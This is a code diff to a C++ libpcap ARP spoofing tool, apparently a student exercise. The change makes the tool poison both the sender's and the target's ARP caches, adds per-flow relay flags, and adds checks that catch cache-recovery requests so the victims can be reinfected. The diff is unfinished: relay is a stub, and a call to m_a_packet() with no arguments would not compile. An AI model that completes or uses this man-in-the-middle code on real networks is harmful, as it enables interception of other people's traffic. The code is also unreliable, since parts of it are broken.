@@ -58,6 +58,7 @@ struct ArpSpoofFlow {
     Ip t_ip;
     Mac s_mac;
     Mac t_mac;
+    bool haveToRelay;
 };
 
 
@@ -68,7 +69,8 @@ void usage() {
 }
 
 /* Go : get */
-Mac get_s_mac(const u_char* packet){
+Mac get_s_mac(const u_char* packet)
+{
 
     Mac s_mac;
     const u_char *cpacket = packet;
@@ -80,8 +82,22 @@ Mac get_s_mac(const u_char* packet){
 
 }
 
+Mac get_t_mac(const u_char* packet)
+{
 
-uint32_t get_me_ip(const std::string& interface) {
+    Mac t_mac;
+    const u_char *cpacket = packet;
+    cpacket += sizeof(EthHdr);
+    ArpHdr *arpHdr = (ArpHdr*) cpacket;
+
+    t_mac = arpHdr->tmac();
+    return t_mac;
+
+}
+
+
+uint32_t get_me_ip(const std::string& interface)
+{
     int fd = socket(AF_INET, SOCK_DGRAM, 0);
     if (fd == -1) {
         perror("socket");
@@ -106,7 +122,8 @@ uint32_t get_me_ip(const std::string& interface) {
     return ntohl(ipaddr->sin_addr.s_addr);
 }
 
-bool get_me_mac(const std::string& interface, uint8_t mac[6]) {
+bool get_me_mac(const std::string& interface, uint8_t mac[6])
+{
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
     if (sock < 0) {
         perror("socket");
@@ -142,7 +159,8 @@ bool get_me_mac(const std::string& interface, uint8_t mac[6]) {
 
 /* Go: Check Packet */
 
-uint32_t c_to_u32_ip(const char* t_ip){
+uint32_t c_to_u32_ip(const char* t_ip)
+{
     uint32_t rt_ip=0;
     uint8_t  tmp=0;
 
@@ -168,7 +186,8 @@ uint32_t c_to_u32_ip(const char* t_ip){
 \
 
 //1. first reply (for sender mac)
-bool isSreply(const u_char* packet, Ip s_ip, Ip m_ip, Mac me_mac ){
+bool isSreply(const u_char* packet, Ip s_ip, Ip m_ip, Mac me_mac )
+{
 
     const u_char *cpacket = packet;
 
@@ -202,7 +221,8 @@ bool isSreply(const u_char* packet, Ip s_ip, Ip m_ip, Mac me_mac ){
 }
 
 //2. request packet sender to target (ask)
-bool isSpoofed(const u_char* packet, Ip s_ip, Ip t_ip, Mac s_mac ,Mac m_mac){
+bool isSpoofed(const u_char* packet, Ip s_ip, Ip t_ip, Mac s_mac ,Mac m_mac)
+{
     const u_char *cpacket = packet;
 
     EthHdr *ethHdr = (EthHdr*) cpacket;
@@ -218,7 +238,7 @@ bool isSpoofed(const u_char* packet, Ip s_ip, Ip t_ip, Mac s_mac ,Mac m_mac){
 
     //printf("cs_ip : %u\n",cs_ip); // debug
     //printf("s_ip : %u\n", ntohl(s_ip)); // debug
-    if(cs_ip!= ntohl(s_ip)) return false; //why not ntohl?
+    if(cs_ip!= ntohl(s_ip)) return false;
     //printf("same1\n");
 
     //3. is t_ip == ct_ip ?
@@ -243,32 +263,55 @@ bool isSpoofed(const u_char* packet, Ip s_ip, Ip t_ip, Mac s_mac ,Mac m_mac){
     return true;
 }
 
-//TODO : fill this function
-//3. request packet sender to target (ask)
-// bool is_s_to_t_req(const u_char* packet, IP s_ip, IP t_ip, Mac s_mac){
+//3.
+bool isArp_and_Rq(const u_char* packet)
+{
 
-//     EthHdr *ethHdr = (EthHdr*) cpacket;
-//     cpacket += sizeof(EthHdr);
-//     ArpHdr *arpHdr = (ArpHdr*) cpacket;
+    const u_char *cpacket = packet;
 
-//     //1. is Arp?
-//     if(ethHdr->type()!= ethHdr->Arp) return false; // GO: not Arp(0x0806)
+    EthHdr *ethHdr = (EthHdr*) cpacket;
+    cpacket += sizeof(EthHdr);
+    ArpHdr *arpHdr = (ArpHdr*) cpacket;
 
+    //printf("isArp_and_Rq called\n"); //debug
 
+    //1. is Arp?
 
-// }
+    if(ethHdr->type()!= ethHdr->Arp) return false; // GO: not Arp(0x0806)
 
-//TODO : fill this function
-//4. request packet target to sender (ask)
+    //printf("isArp\n"); //debug
+
+    //2. is s_ip == cs_ip ?
+    uint16_t c_op = arpHdr->op();
+    if(c_op!= arpHdr->Request) return false;
+
+    printf("recover case1\n"); //debug
+
+    return true;
+}
+
+//4.is recover case?
+bool isRecoverCase(const u_char* packet, Ip s_ip)
+{
+    const u_char *cpacket = packet;
+
+    EthHdr *ethHdr = (EthHdr*) cpacket;
+    cpacket += sizeof(EthHdr);
+    ArpHdr *arpHdr = (ArpHdr*) cpacket;
+
+    Ip cs_ip = arpHdr->sip();
+
+    //printf("cs_ip : %u\n",cs_ip); // debug
+    //printf("s_ip : %u\n", ntohl(s_ip)); // debug
+    if(cs_ip!= ntohl(s_ip)) return false;
+
+    printf("recover case2\n"); //debug
+    return true;
+
+}
 
 
 /* Go: Check Packet end */
-
-
-
-
-
-
 
 
 /* Go: Make Packet */
@@ -291,7 +334,6 @@ EthArpPacket m_rq_packet(Mac me_mac, Ip m_ip, Ip v_ip){
 
     return packet;
 }
-
 
 EthArpPacket m_a_packet(Mac me_mac, Ip t_ip, Mac v_mac, Ip v_ip){
     EthArpPacket packet;
@@ -378,9 +420,11 @@ int main(int argc, char* argv[]) {
             //3. is_Sreply
             if(!isSreply(packet, s_ip, me_ip, me_mac ))continue;
 
-
-            //4. get Smac (sender mac)
+            //4-1. get Smac (sender mac)
             Mac s_mac = get_s_mac(packet);
+
+            //4-2. get Tmac (target mac)
+            Mac t_mac = get_t_mac(packet);
 
             //5. make sender attack packet
             Ip t_ip = Ip(c_to_u32_ip(argv[re*2+3]));
@@ -389,15 +433,24 @@ int main(int argc, char* argv[]) {
             Ip ttt_ip = Ip(htonl(*tt_ip));
 
 
-            EthArpPacket attack_packet = m_a_packet(me_mac, ttt_ip, s_mac, s_ip);
+            EthArpPacket attack_packet = m_a_packet(me_mac, ttt_ip, s_mac, s_ip); //sender
+            EthArpPacket attack_packet_target = m_a_packet(me_mac, s_ip, t_mac, ttt_ip); //TODO : check is it right in wireshark
 
-            //6. send the attack_packet
+            //6-1. send the attack_packet (sender)
             int res2 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet), sizeof(EthArpPacket));
             if (res2 != 0) {
                 fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
             }
 
-            spoof_flows.push_back({s_ip, ttt_ip, s_mac, me_mac});
+            //6-2. send the attack_packet (target)
+            // target thinks sender's mac is me
+            int res3 = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&attack_packet_target), sizeof(EthArpPacket));
+            if (res3 != 0) {
+                fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res2, pcap_geterr(pcap));
+            }
+
+            spoof_flows.push_back({s_ip, ttt_ip, s_mac, me_mac, true});
+            spoof_flows.push_back({ttt_ip, s_ip, t_mac, me_mac, true});
 
 
             //pcap_close(pcap);
@@ -407,47 +460,42 @@ int main(int argc, char* argv[]) {
     }
 
 
-
-
     /* GO : 1. infect senders end */
 
 
     //TODO : send relay packet
     /* GO : send relay packet and recover attack*/
-    while(true){
+    while(true)
+    {
 
         struct pcap_pkthdr* header;
         const u_char* packet;
         int res = pcap_next_ex(pcap, &header, &packet);
         if (res == 0) continue;
-        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
+        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK)
+        {
             printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
             break;
         }
 
 
+        //1. send relay packet
+        for (int i=0; i<repeat_time; i++)
+        {
+             if(!spoof_flows[i].haveToRelay||!isSpoofed(packet, spoof_flows[i].s_ip, spoof_flows[i].t_ip, spoof_flows[i].s_mac, spoof_flows[i].t_mac)) continue;
 
-        for (int i=0; i<repeat_time; i++){
-             if(!isSpoofed(packet, spoof_flows[i].s_ip, spoof_flows[i].t_ip, spoof_flows[i].s_mac, spoof_flows[i].t_mac)) continue;
-             //1. send relay packet
              //m_relay_packet();
-             //2-1. recover case1
-             if(!)
 
         }
 
-        //2-1. recover case1
+        //2. check recover case and send reinfect packet
+        for (int i=0; i<repeat_time; i++)
+        {
+            if(!isArp_and_Rq(packet)) continue;
+            if(!isRecoverCase(packet, spoof_flows[i].s_ip)) continue;
+            m_a_packet();
 
-
-
-        //2-2. recover case2
-
-
-
-
-
-        //pcap_close(pcap);
-        //break;
+        }
 
 
     }
